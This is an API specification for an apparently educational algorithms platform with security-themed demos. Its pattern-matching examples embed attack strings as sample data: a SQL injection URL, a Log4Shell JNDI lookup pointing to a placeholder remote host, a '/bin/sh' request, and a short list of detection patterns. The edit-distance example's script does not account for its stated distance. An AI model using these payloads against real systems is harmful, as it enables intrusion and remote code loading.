# CyberShield REST API Specification

Base URL: `http://localhost:8080/api/v1`  
Interactive OpenAPI UI: `http://localhost:8080/swagger-ui.html`  
OpenAPI JSON Specification: `http://localhost:8080/api-docs`

---

## 1. System Envelopes & Conventions

### Uniform Response Envelope
All algorithm execution endpoints return an envelope of type `AlgorithmResponse<T>`:

```json
{
  "executionId": "c4d3269b-8cfc-4e89-a2e6-a2e99f0e34c2",
  "algorithmId": "kmp",
  "status": "SUCCESS",
  "result": { ... },
  "metrics": {
    "executionTimeNanos": 1348700,
    "comparisonCount": 65,
    "inputSize": 60
  },
  "trace": [
    "LPS mismatch: i=1, lps[1]=0",
    "i=0, j=0, mismatch: text[0]='G' != pattern[0]='O'",
    ...
  ],
  "warnings": [],
  "timestamp": "2026-10-13T17:21:28.886915200Z",
  "error": null
}
```

### Error Envelope
```json
{
  "status": 400,
  "message": "Request validation failed",
  "details": [
    "pattern: Pattern cannot be empty"
  ],
  "timestamp": "2026-10-13T17:25:00.000Z"
}
```

---

## 2. Core Telemetry Endpoints

### `GET /health`
Returns backend health and database probe state.
- **Response**:
  ```json
  {
    "status": "UP",
    "database": "UP",
    "platform": "CyberShield Enterprise Analytics Platform",
    "version": "1.0.0",
    "timestamp": "2026-10-13T17:21:21.194409500Z"
  }
  ```

### `GET /dashboard/overview`
Aggregated telemetry, recent executions, module readiness, and signature statistics.
- **Response**:
  ```json
  {
    "totalEvents": 20,
    "totalSignatures": 15,
    "totalExecutions": 12,
    "recentExecutions": [ ... ],
    "algorithmStats": {
      "M1": { "count": 5, "avgTimeNanos": 1204000 },
      "M4": { "count": 2, "avgTimeNanos": 3410000 }
    },
    "systemStatus": {
      "database": "UP",
      "backend": "UP"
    }
  }
  ```

### `GET /algorithms`
Returns the metadata catalogue for all DSA algorithms (M1–M6) including Big-O complexity and cybersecurity application mapping.

---

## 3. Module M1: String Algorithms

### `POST /algorithms/kmp`
Knuth-Morris-Pratt pattern search with non-backtracking LPS table.
- **Request**:
  ```json
  {
    "text": "GET /login?user=admin' OR 1=1-- HTTP/1.1",
    "pattern": "OR 1=1"
  }
  ```
- **Response `result`**:
  ```json
  {
    "matchPositions": [ 23 ],
    "lpsArray": [ 0, 0, 0, 0, 0, 0 ],
    "comparisonCount": 65,
    "trace": [ ... ]
  }
  ```

### `POST /algorithms/z-function`
Linear-time Z-box computation and pattern matching.
- **Request**:
  ```json
  {
    "text": "192.168.1.100 attack 192.168.1.100 probe",
    "pattern": "192.168.1.100"
  }
  ```
- **Response `result`**:
  ```json
  {
    "zArray": [ 0, 0, 0, ... ],
    "matchPositions": [ 0, 21 ],
    "comparisonCount": 42
  }
  ```

### `POST /algorithms/rabin-karp`
Polynomial rolling hash matching (`BASE=31`, `MOD=1_000_000_007`) with character verification on hash matches.
- **Request**:
  ```json
  {
    "text": "GET /bin/sh HTTP/1.1",
    "pattern": "/bin/sh"
  }
  ```
- **Response `result`**:
  ```json
  {
    "matchPositions": [ 4 ],
    "spuriousHits": 0,
    "comparisonCount": 18
  }
  ```

### `POST /algorithms/aho-corasick`
Simultaneous dictionary matching using a Trie with BFS failure links and dictionary output links.
- **Request**:
  ```json
  {
    "text": "User-Agent: ${jndi:ldap://203.0.113.42:1389/Exploit} OR 1=1",
    "patterns": [ "${jndi:ldap://", "OR 1=1", "<script>" ]
  }
  ```
- **Response `result`**:
  ```json
  {
    "matches": [
      { "pattern": "${jndi:ldap://", "position": 12 },
      { "pattern": "OR 1=1", "position": 53 }
    ],
    "trieNodes": [
      { "id": 0, "character": null, "children": { ... }, "failureLinkTarget": 0, "outputPatterns": [] }
    ]
  }
  ```

---

## 4. Module M2: Suffix Structures

### `POST /algorithms/suffix-array`
Sorted suffix array construction via comparator sorting with binary search queries.
- **Request**: `{ "text": "abracadabra", "query": "cad" }`

### `POST /algorithms/sa-is`
Real linear-time SA-IS (Induced Sorting) algorithm with S/L/LMS type classification.
- **Request**: `{ "text": "banana" }`

### `POST /algorithms/lcp-kasai`
Kasai $O(n)$ linear Longest Common Prefix calculation from suffix array.
- **Request**: `{ "text": "banana" }`

### `POST /algorithms/suffix-automaton`
Directed Acyclic Word Graph (DAWG) online state transitions and link traversal.
- **Request**: `{ "text": "mississippi", "query": "ssip" }`

---

## 5. Module M3: Advanced Dynamic Programming

### `POST /algorithms/edit-distance`
Computes Levenshtein, Damerau-Levenshtein (OSA), or Weighted Edit Distance with backtrace edit script.
- **Request**:
  ```json
  {
    "source": "ATTACK_ALPHA",
    "target": "ATTACK_BETA",
    "variant": "LEVENSHTEIN",
    "insertCost": 1,
    "deleteCost": 1,
    "substituteCost": 1
  }
  ```
- **Response `result`**:
  ```json
  {
    "distance": 4,
    "dpMatrix": [ ... ],
    "editScript": [
      "MATCH 'ATTACK_'",
      "SUBSTITUTE 'A' -> 'B'",
      "SUBSTITUTE 'L' -> 'E'",
      "SUBSTITUTE 'P' -> 'T'",
      "SUBSTITUTE 'H' -> 'A'"
    ]
  }
  ```

### `POST /algorithms/bitmask-dp`
Finds minimum-cost subset of security rules covering all required policies across $2^n$ state space.
- **Request**:
  ```json
  {
    "rules": [
      { "ruleId": 1, "cost": 10, "coveredPolicies": [0, 1] },
      { "ruleId": 2, "cost": 15, "coveredPolicies": [1, 2] }
    ],
    "requiredPolicies": [0, 1, 2]
  }
  ```

### `POST /algorithms/matrix-chain`
Dynamic programming optimization for multi-matrix security event transformation pipelines.
- **Request**: `{ "dimensions": [10, 30, 5, 60] }`

---

## 6. Module M4: Network Flow & Matching

### `POST /algorithms/max-flow`
Evaluates flow bottleneck on a directed network using Ford-Fulkerson, Edmonds-Karp, or Dinic's algorithm.
- **Request**:
  ```json
  {
    "nodes": 6,
    "source": 0,
    "sink": 5,
    "algorithm": "DINIC",
    "edges": [
      { "from": 0, "to": 1, "capacity": 16 },
      { "from": 0, "to": 2, "capacity": 13 },
      { "from": 1, "to": 2, "capacity": 10 },
      { "from": 1, "to": 3, "capacity": 12 },
      { "from": 2, "to": 4, "capacity": 14 },
      { "from": 3, "to": 5, "capacity": 20 },
      { "from": 4, "to": 3, "capacity": 7 },
      { "from": 4, "to": 5, "capacity": 4 }
    ]
  }
  ```

### `POST /algorithms/bipartite-matching`
Calculates maximal matching of security analysts to high-severity alerts.

### `POST /algorithms/min-cut`
Computes source/sink reachability partition and cut edges via Max-Flow Min-Cut theorem.

---

## 7. Module M5: NP-Completeness & Approximation

### `POST /algorithms/sat`
DPLL exhaustive satisfiability solver with unit propagation ($N \le 20$ variables).
- **Request**:
  ```json
  {
    "numVariables": 3,
    "clauses": [
      [ 1, 2, -3 ],
      [ -1, -2, 3 ],
      [ 1, -2, 3 ]
    ]
  }
  ```

### `POST /algorithms/reductions`
Executes polynomial reduction chain: 3-SAT $\to$ CLIQUE $\to$ INDEPENDENT SET $\to$ VERTEX COVER.

### `POST /algorithms/vertex-cover`
Greedy 2-approximation maximal matching for network sensor placement.

---

## 8. Module M6: Randomized & Parallel Algorithms

### `POST /algorithms/miller-rabin`
Probabilistic primality test using quadratic residue witnesses with BigInteger arithmetic.
- **Request**: `{ "number": 10007, "rounds": 10 }`

### `POST /algorithms/randomized-quicksort`
Las Vegas sorting with uniform random pivot selection and partition recursion tracking.

### `POST /algorithms/reservoir-sampling`
Single-pass Algorithm R streaming sampler with $O(k)$ memory.

### `POST /algorithms/parallel-scan`
Blelloch exclusive prefix scan with Up-Sweep reduction and Down-Sweep distribution tree steps.

### `POST /algorithms/brents-theorem`
PRAM work-depth speedup estimation bounds calculator ($T_p \le (W - D)/p + D$).

---

## 9. Security Events & Audit History

- `GET /events`: Paginated security logs with filtering by `severity` and `type`.
- `GET /events/{id}`: Detailed event payload.
- `GET /executions`: Paginated algorithm execution audit trail.
- `GET /executions/{id}`: Full result payload, metrics, and trace for an execution.
- `POST /algorithms/benchmark`: Executes $N$ trials with 5 JVM warmup rounds and stores median runtime.
